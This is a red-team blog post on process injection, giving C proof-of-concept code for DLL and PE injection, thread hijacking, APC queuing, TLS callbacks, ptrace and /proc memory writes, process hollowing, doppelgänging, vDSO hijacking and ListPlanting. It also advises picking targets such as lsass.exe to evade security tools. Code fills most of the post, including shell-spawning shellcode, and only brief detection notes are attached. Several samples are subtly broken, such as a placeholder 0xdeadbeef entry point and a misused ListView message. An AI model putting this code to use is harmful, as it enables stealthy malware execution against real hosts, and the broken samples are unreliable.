---
title: "Process Injection Techniques: Hiding in the Open"
image: "images/blog/pei.png"
date: "2025-10-01"
excerpt: "The core concept is simple: instead of executing code in your own process, you force another process to execute it for you. This provides two main advantage ..."
category: "Red Team"
featured: true
---

Process injection is a technique that allows code to run inside the address space of another process. It's used by both legitimate software (debuggers, sandboxes) and malicious actors (malware, post-exploitation tools).

The core concept is simple: instead of executing code in your own process, you force another process to execute it for you. This provides two main advantages:

1.	 **Evasion** - Security tools monitoring specific processes won't see your code running
2.	 **Privilege escalation** - You inherit the permissions and access rights of the target process

Windows provides legitimate APIs for interacting with other processes—debugging, memory allocation, thread creation. Process injection abuses these same APIs for unauthorized code execution.

This article breaks down how process injection works and the most common techniques. We'll start with the foundational method that all others build upon.

## Methods of Target Process Selection

Before injection can happen, an attacker must choose which process to target. This selection generally falls into two categories.

### Hardcoded Targeting

The simplest approach: target a specific process by name. Common choices include:

- **System processes** - `svchost.exe`, `lsass.exe`, `winlogon.exe` (often have high privileges)
- **Browser processes** - `chrome.exe`, `firefox.exe`, `iexplore.exe` (frequently used, trusted by firewalls)
- **Office applications** - `winword.exe`, `excel.exe` (can blend in with normal user activity)

The attacker hardcodes the process name into their code. If that process is running, they inject into it. If not, they wait or fail.

### Dynamic Targeting

More sophisticated than hardcoded names. The attacker scans running processes and selects a target based on criteria:

- **Privilege level** - Find processes running as SYSTEM or Administrator
- **Process age** - Older, established processes look less suspicious than newly created ones
- **Integrity level** - Target processes with specific integrity levels (High, Medium, Low)
- **Process ancestry** - Avoid processes that might trigger alerts (sandboxes, monitoring tools)

Common dynamic targeting logic looks for explorer.exe or other user-facing processes that:
- Are always running
- Have network activity (to blend C2 traffic)
- Are less likely to be closely monitored by security tools

The choice of target directly impacts stealth and success. A poorly chosen process can trigger detection or fail to provide the desired privileges.

## Process Injection Techniques

Once a target process is selected, the attacker needs a way to inject and execute code. Here are the most common techniques, from classic to advanced, with proof-of-concept code for each.

### Dynamic-Link Library Injection

The most well-known injection method. The attacker forces the target process to load a malicious DLL.

**How it works:**
1. Allocate memory in the target process (`VirtualAllocEx`)
2. Write the DLL path to that memory (`WriteProcessMemory`)
3. Create a remote thread that calls `LoadLibrary` with the DLL path (`CreateRemoteThread`)

**POC Code:**
```c
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD pid = 1234; // Target process ID
    char dllPath[] = "C:\\malicious.dll";
    
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("OpenProcess failed: %d\n", GetLastError());
        return 1;
    }
    
    // Allocate memory in target process
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), 
                                       MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMem) {
        printf("VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    
    // Write DLL path to allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteMem, dllPath, sizeof(dllPath), NULL)) {
        printf("WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    
    // Get address of LoadLibraryA in kernel32.dll
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    
    // Create remote thread to load the DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)pLoadLibrary, 
                                       pRemoteMem, 0, NULL);
    if (!hThread) {
        printf("CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("DLL injected successfully!\n");
    WaitForSingleObject(hThread, INFINITE);
    
    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return 0;
}
```

**Detection:** Monitor `CreateRemoteThread` calls paired with `LoadLibraryA/W`, especially across process boundaries.

### Portable Executable Injection

Instead of loading an external DLL, this technique writes the entire PE file (EXE or DLL) directly into the target's memory.

**How it works:**
1. Allocate memory in the target process
2. Write the PE image into that memory
3. Calculate the entry point of the written image
4. Create a remote thread starting at that entry point

**POC Code:**
```c
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD pid = 1234; // Target process ID
    HANDLE hFile = CreateFileA("C:\\payload.exe", GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open payload file\n");
        return 1;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID pPayloadBuffer = VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    
    DWORD bytesRead;
    ReadFile(hFile, pPayloadBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    // Parse PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pPayloadBuffer;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pPayloadBuffer + pDosHeader->e_lfanew);
    
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("OpenProcess failed\n");
        VirtualFree(pPayloadBuffer, 0, MEM_RELEASE);
        return 1;
    }
    
    // Allocate memory in target
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, 
                                       MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        printf("VirtualAllocEx failed\n");
        CloseHandle(hProcess);
        VirtualFree(pPayloadBuffer, 0, MEM_RELEASE);
        return 1;
    }
    
    // Write PE headers
    WriteProcessMemory(hProcess, pRemoteMem, pPayloadBuffer, 
                       pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
    
    // Write each section
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pRemoteMem + pSectionHeader[i].VirtualAddress),
                          (LPVOID)((DWORD_PTR)pPayloadBuffer + pSectionHeader[i].PointerToRawData),
                          pSectionHeader[i].SizeOfRawData, NULL);
    }
    
    // Calculate entry point
    LPVOID pEntryPoint = (LPVOID)((DWORD_PTR)pRemoteMem + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    
    // Create remote thread at entry point
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)pEntryPoint, 
                                       NULL, 0, NULL);
    if (!hThread) {
        printf("CreateRemoteThread failed\n");
    } else {
        printf("PE injected and executed!\n");
        CloseHandle(hThread);
    }
    
    VirtualFree(pPayloadBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return 0;
}
```

**Detection:** Look for memory regions with both write and execute permissions (RWX) and threads starting from unbacked memory.

### Thread Execution Hijacking

Rather than creating a new thread, this technique takes over an existing one.

**How it works:**
1. Suspend a thread in the target process
2. Save its current context (registers)
3. Modify the instruction pointer to point to injected shellcode
4. Resume the thread

**POC Code:**
```c
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD pid = 1234; // Target process ID
    DWORD tid = 5678; // Target thread ID (find via Toolhelp32Snapshot)
    
    // x64 shellcode (MessageBox example)
    unsigned char shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,           // sub rsp, 40
        0x48, 0x31, 0xC9,                 // xor rcx, rcx
        0x48, 0x31, 0xD2,                 // xor rdx, rdx
        0x4D, 0x31, 0xC0,                 // xor r8, r8
        0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, 0 (MessageBoxA address)
        0xFF, 0xD0,                       // call rax
        0x48, 0x83, 0xC4, 0x28,           // add rsp, 40
        0xC3                               // ret
    };
    
    // Open target process and thread
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    
    if (!hProcess || !hThread) {
        printf("Open failed\n");
        return 1;
    }
    
    // Suspend the thread
    SuspendThread(hThread);
    
    // Save thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    
    // Allocate memory for shellcode
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), 
                                       MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // Write shellcode
    WriteProcessMemory(hProcess, pRemoteMem, shellcode, sizeof(shellcode), NULL);
    
    // Update instruction pointer to shellcode
    #ifdef _WIN64
    ctx.Rip = (DWORD64)pRemoteMem;
    #else
    ctx.Eip = (DWORD)pRemoteMem;
    #endif
    
    // Set new context and resume
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    
    printf("Thread hijacked!\n");
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 0;
}
```

**Detection:** Monitor thread suspension and context modification events, especially when paired with memory allocation in the same process.

### Asynchronous Procedure Call

APCs are legitimate mechanisms for executing code in a specific thread. Attackers abuse them.

**How it works:**
1. Allocate and write shellcode to the target process
2. Queue an APC to an existing thread (`QueueUserAPC`)
3. The thread executes the APC when it enters an alertable state

**POC Code:**
```c
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD pid = 1234; // Target process ID
    DWORD tid = 5678; // Target thread ID
    
    // MessageBox shellcode (simplified)
    unsigned char shellcode[] = {
        0x31, 0xc9,                    // xor ecx, ecx
        0x31, 0xd2,                    // xor edx, edx
        0x31, 0xc0,                    // xor eax, eax
        0xb8, 0x00, 0x00, 0x00, 0x00,  // mov eax, 0 (MessageBoxA address)
        0xff, 0xd0,                     // call eax
        0xc3                             // ret
    };
    
    // Open target process and thread
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    
    if (!hProcess || !hThread) {
        printf("Open failed\n");
        return 1;
    }
    
    // Allocate and write shellcode
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), 
                                       MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteMem, shellcode, sizeof(shellcode), NULL);
    
    // Queue APC to the target thread
    QueueUserAPC((PAPCFUNC)pRemoteMem, hThread, NULL);
    
    printf("APC queued. Will execute when thread enters alertable state.\n");
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 0;
}
```

**Detection:** Monitor `QueueUserAPC` calls pointing to shellcode addresses. Alert on APCs firing from unexpected sources.

### Thread Local Storage

TLS callbacks execute code before the main entry point of a process. Attackers use this for early code execution.

**How it works:**
1. Create a PE with a malicious TLS callback function
2. Get the target to load this PE (through injection or as a legitimate module)
3. The TLS callback executes when the thread attaches to the process

**POC Code (DLL with TLS callback):**
```c
#include <windows.h>
#include <stdio.h>

// TLS callback function
void NTAPI TLSCallback(PVOID hModule, DWORD dwReason, PVOID pContext) {
    if (dwReason == DLL_THREAD_ATTACH || dwReason == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "TLS Callback Executed!", "Injection", MB_OK);
        // Malicious code here
    }
}

// Define TLS callback section
#ifdef _WIN64
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:p_tls_callback")
#else
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_p_tls_callback")
#endif

// TLS callback array
EXTERN_C
#ifdef _WIN64
#pragma const_seg(".CRT$XLA")
const PIMAGE_TLS_CALLBACK p_tls_callback = TLSCallback;
#pragma const_seg()
#else
#pragma data_seg(".CRT$XLA")
PIMAGE_TLS_CALLBACK p_tls_callback = TLSCallback;
#pragma data_seg()
#endif

// DllMain (optional)
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    // TLS callback will fire before this
    return TRUE;
}
```

**Detection:** Examine PE headers for TLS callbacks, especially in unsigned or suspicious modules.

### Ptrace System Calls (Linux)

On Linux systems, `ptrace` allows debugging and controlling processes. Attackers use it to inject code.

**How it works:**
1. Attach to target process with `ptrace(PTRACE_ATTACH)`
2. Save register state
3. Allocate memory in target (via mmap injection or direct code writing)
4. Modify instruction pointer to execute shellcode
5. Restore state and detach

**POC Code (Linux):**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

int main() {
    pid_t pid = 1234; // Target process ID
    
    // x86_64 shellcode (execve /bin/sh)
    unsigned char shellcode[] = {
        0x48, 0x31, 0xc0,              // xor rax, rax
        0x48, 0x31, 0xff,              // xor rdi, rdi
        0x48, 0x31, 0xf6,              // xor rsi, rsi
        0x48, 0x31, 0xd2,              // xor rdx, rdx
        0x4d, 0x31, 0xc0,              // xor r8, r8
        0x6a, 0x3b,                    // push 0x3b
        0x58,                          // pop rax
        0x48, 0xbb, 0x2f, 0x62, 0x69,  // mov rbx, 0x68732f6e69622f
        0x6e, 0x2f, 0x73, 0x68, 0x00,
        0x53,                          // push rbx
        0x48, 0x89, 0xe7,              // mov rdi, rsp
        0x0f, 0x05                      // syscall
    };
    
    // Attach to process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return 1;
    }
    
    waitpid(pid, NULL, 0);
    
    // Get current registers
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    
    // Save original instruction
    long original_ins = ptrace(PTRACE_PEEKTEXT, pid, regs.rip, NULL);
    
    // Write shellcode (word by word)
    for (int i = 0; i < sizeof(shellcode); i += sizeof(long)) {
        long data = 0;
        memcpy(&data, shellcode + i, sizeof(long));
        ptrace(PTRACE_POKETEXT, pid, regs.rip + i, data);
    }
    
    // Execute shellcode
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    
    // Restore original instruction (optional)
    // ptrace(PTRACE_POKETEXT, pid, regs.rip, original_ins);
    
    // Detach
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    
    printf("Ptrace injection completed\n");
    
    return 0;
}
```

**Detection:** Monitor `ptrace` calls on non-child processes and unexpected code execution patterns.

### Proc Memory (/proc/[pid]/mem) - Linux

Linux exposes process memory through the `/proc` filesystem. Attackers can write directly to `/proc/[pid]/mem`.

**How it works:**
1. Open `/proc/[pid]/mem`
2. Seek to a target memory address
3. Write shellcode directly
4. Trigger execution (via signal or existing thread)

**POC Code (Linux):**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

int main() {
    pid_t pid = 1234; // Target process ID
    
    // Simple shellcode (int3 for breakpoint - test only)
    unsigned char shellcode[] = {0xcc, 0xc3}; // int3; ret
    
    char mem_path[256];
    sprintf(mem_path, "/proc/%d/mem", pid);
    
    // Need to stop the process first
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return 1;
    }
    waitpid(pid, NULL, 0);
    
    // Open process memory
    int mem_fd = open(mem_path, O_RDWR);
    if (mem_fd < 0) {
        perror("open mem");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }
    
    // Get current instruction pointer
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    
    // Seek to RIP
    lseek(mem_fd, regs.rip, SEEK_SET);
    
    // Write shellcode
    write(mem_fd, shellcode, sizeof(shellcode));
    
    close(mem_fd);
    
    // Continue execution
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    
    printf("Memory written via /proc\n");
    
    return 0;
}
```

**Detection:** Monitor access to `/proc/[pid]/mem` files and ptrace attachment patterns.

### Extra Window Memory Injection

Windows allows storing data in extra memory associated with windows. Attackers can use this for injection.

**How it works:**
1. Find a target window
2. Write shellcode to the window's extra memory (`SetWindowLong`)
3. Execute via window procedure or callback

**POC Code:**
```c
#include <windows.h>
#include <stdio.h>

// Window procedure that executes code from extra memory
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_USER + 1337) {
        // Get function pointer from window extra memory
        void (*func)() = (void (*)())GetWindowLongPtr(hWnd, 0);
        if (func) func();
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

int main() {
    // Find target window (example: Notepad)
    HWND hTargetWnd = FindWindowA("Notepad", NULL);
    if (!hTargetWnd) {
        printf("Target window not found\n");
        return 1;
    }
    
    // Simple shellcode (MessageBox)
    unsigned char shellcode[] = {
        0x31, 0xc9,                    // xor ecx, ecx
        0x31, 0xd2,                    // xor edx, edx
        0x31, 0xc0,                    // xor eax, eax
        0xb8, 0x00, 0x00, 0x00, 0x00,  // mov eax, 0 (MessageBoxA)
        0xff, 0xd0,                     // call eax
        0xc3                             // ret
    };
    
    // Allocate executable memory for shellcode
    LPVOID pShellcode = VirtualAlloc(NULL, sizeof(shellcode), 
                                     MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pShellcode, shellcode, sizeof(shellcode));
    
    // Store pointer in window extra memory
    SetWindowLongPtr(hTargetWnd, 0, (LONG_PTR)pShellcode);
    
    // Trigger execution via message
    SendMessage(hTargetWnd, WM_USER + 1337, 0, 0);
    
    printf("Window memory injection attempted\n");
    
    return 0;
}
```

**Detection:** Monitor `SetWindowLong` with function pointers and unusual window messages.

### Process Hollowing

The attacker creates a legitimate process in a suspended state, replaces its memory with malicious code, then resumes it.

**How it works:**
1. Create a legitimate process in suspended mode (`CREATE_SUSPENDED`)
2. Unmap the original executable from the process
3. Allocate memory and write malicious PE
4. Set the entry point to the malicious code
5. Resume the main thread

**POC Code:**
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Start legitimate process suspended
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (!CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, 
                        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed\n");
        return 1;
    }
    
    printf("Suspended process created: %d\n", pi.dwProcessId);
    
    // Get process context to find entry point
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // Read original PE header to find image base
    LPVOID pImageBase = (LPVOID)ctx.Ebx + 8; // PEB address in EBX+8 for x86
    
    // For simplicity, we'd normally:
    // 1. Read PEB to get ImageBaseAddress
    // 2. Unmap the original executable with NtUnmapViewOfSection
    // 3. Allocate new memory at preferred base
    // 4. Write malicious PE
    // 5. Set new entry point in context
    // 6. Resume thread
    
    // Example of modifying entry point (simplified)
    #ifdef _WIN64
    ctx.Rcx = (DWORD64)0xdeadbeef; // New entry point
    #else
    ctx.Eax = 0xdeadbeef; // New entry point for x86
    #endif
    
    SetThreadContext(pi.hThread, &ctx);
    
    // Resume thread - now executes hollowed code
    ResumeThread(pi.hThread);
    
    printf("Process hollowing completed\n");
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 0;
}
```

**Detection:** Monitor processes started suspended and memory unmapping operations.

### Process Doppelgänging

A more advanced variant that uses NTFS transactions to load a malicious executable under the guise of a legitimate one.

**How it works:**
1. Create a transacted file
2. Write malicious PE to the transacted file
3. Create a section from the transacted file
4. Create a process from the section
5. Rollback the transaction (file disappears)

**POC Code (simplified):**
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        printf("CreateTransaction failed\n");
        return 1;
    }
    
    // Create a file in the transaction
    HANDLE hFile = CreateFileTransactedA("C:\\temp\\legit.exe", 
                                         GENERIC_READ | GENERIC_WRITE,
                                         0, NULL, CREATE_ALWAYS,
                                         FILE_ATTRIBUTE_NORMAL, NULL,
                                         hTransaction, NULL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFileTransacted failed\n");
        CloseHandle(hTransaction);
        return 1;
    }
    
    // Write malicious PE to the file
    // ... (write PE data)
    
    // Create section from transacted file
    HANDLE hSection = NULL;
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, 
                    PAGE_READONLY, SEC_IMAGE, hFile);
    
    // Create process from section
    HANDLE hProcess = NULL;
    NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, 
                      NtCurrentProcess(), PS_INHERIT_HANDLES,
                      hSection, NULL, NULL, FALSE);
    
    // Rollback transaction - file never existed
    RollbackTransaction(hTransaction);
    
    printf("Process Doppelgänging attempted\n");
    
    return 0;
}
```

**Detection:** Monitor process creation from sections and NTFS transaction activity.

### VDSO Hijacking (Linux)

The vDSO (virtual dynamic shared object) is a memory region mapped by the kernel into every process. Attackers can overwrite vDSO functions.

**How it works:**
1. Locate vDSO region in target process (from `/proc/pid/maps`)
2. Overwrite a vDSO function (like `gettimeofday`) with shellcode
3. When the target calls that function, shellcode executes

**POC Code (Linux):**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

int main() {
    pid_t pid = 1234; // Target process ID
    
    // Find vDSO address (simplified - normally parse /proc/pid/maps)
    unsigned long vdso_addr = 0x7fff00000000; // Example address
    
    // Simple shellcode
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90,  // NOP sled
        0xcc,              // int3 (breakpoint - test only)
        0xc3               // ret
    };
    
    // Attach to process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return 1;
    }
    waitpid(pid, NULL, 0);
    
    // Write shellcode to vDSO (overwriting a function)
    for (int i = 0; i < sizeof(shellcode); i += sizeof(long)) {
        long data = 0;
        memcpy(&data, shellcode + i, sizeof(long));
        ptrace(PTRACE_POKETEXT, pid, vdso_addr + i, data);
    }
    
    // Detach
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    
    printf("vDSO hijacking attempted\n");
    
    return 0;
}
```

**Detection:** Monitor vDSO region for modifications (rare and suspicious).

### ListPlanting

Abuses Windows ListView and TreeView controls to execute code via message handling.

**How it works:**
1. Find a window with ListView/TreeView control
2. Allocate shellcode in the target process
3. Set the control's callback to point to shellcode
4. Trigger a message that invokes the callback

**POC Code:**
```c
#include <windows.h>
#include <commctrl.h>
#include <stdio.h>

#pragma comment(lib, "comctl32.lib")

int main() {
    // Find a ListView control (example: Explorer window)
    HWND hListView = FindWindowA("SysListView32", NULL);
    if (!hListView) {
        printf("ListView not found\n");
        return 1;
    }
    
    DWORD pid;
    GetWindowThreadProcessId(hListView, &pid);
    
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("OpenProcess failed\n");
        return 1;
    }
    
    // Simple shellcode
    unsigned char shellcode[] = {
        0x31, 0xc9,                    // xor ecx, ecx
        0x31, 0xd2,                    // xor edx, edx
        0x31, 0xc0,                    // xor eax, eax
        0xb8, 0x00, 0x00, 0x00, 0x00,  // mov eax, 0 (MessageBoxA)
        0xff, 0xd0,                     // call eax
        0xc3                             // ret
    };
    
    // Allocate shellcode in target
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                       MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteMem, shellcode, sizeof(shellcode), NULL);
    
    // Set ListView callback to shellcode
    // LVM_SETCALLBACKMASK or custom window proc
    SendMessage(hListView, LVM_SETCALLBACKMASK, 0, (LPARAM)pRemoteMem);
    
    // Trigger redraw which may invoke callback
    InvalidateRect(hListView, NULL, TRUE);
    UpdateWindow(hListView);
    
    printf("ListPlanting attempted\n");
    
    CloseHandle(hProcess);
    
    return 0;
}
```


## Conclusion

Process injection remains one of the most powerful and stealthy techniques in both offensive security tooling and malware. Understanding how each method works from classic DLL injection to advanced process techniques is essential for both building better defenses and conducting thorough security assessments.
The arms race between injection techniques and detection continues to evolve, but the fundamentals covered here form the foundation for understanding both current and future methods.
